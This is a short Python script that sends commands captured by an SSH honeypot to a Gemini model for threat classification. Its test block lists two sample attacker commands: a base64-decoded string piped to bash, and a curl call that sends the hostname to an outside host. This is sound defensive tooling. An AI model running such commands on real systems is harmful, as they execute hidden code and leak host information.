import os
import json
from dotenv import load_dotenv
from google import genai

load_dotenv(os.path.join(os.path.dirname(__file__), "..", ".env"))

client = genai.Client(api_key=os.getenv("GEMINI_API_KEY"))

SYSTEM_PROMPT = """You are a security analyst classifying commands typed into an SSH honeypot.
Respond ONLY with valid JSON, no other text, in this exact format:
{"label": "benign|suspicious|malicious", "severity": "low|medium|high|critical", "reasoning": "<one short sentence>"}
"""

def classify_llm(command: str):
    try:
        response = client.models.generate_content(
            model="gemini-flash-lite-latest",
            contents=f"{SYSTEM_PROMPT}\n\nClassify this command: {command}"
        )
        text = response.text.strip()
        text = text.replace("```json", "").replace("```", "").strip()
        result = json.loads(text)
        result["layer"] = "llm"
        return result
    except Exception as e:
        return {"label": "unknown", "severity": "unknown", "reasoning": str(e), "layer": "llm_error"}


if __name__ == "__main__":
    tests = [
        "echo aGVsbG8gd29ybGQ= | base64 -d | bash",
        "curl -s http://x.io/s.php?id=$(hostname) -o /dev/null",
    ]
    for t in tests:
        print(t, "->", classify_llm(t))
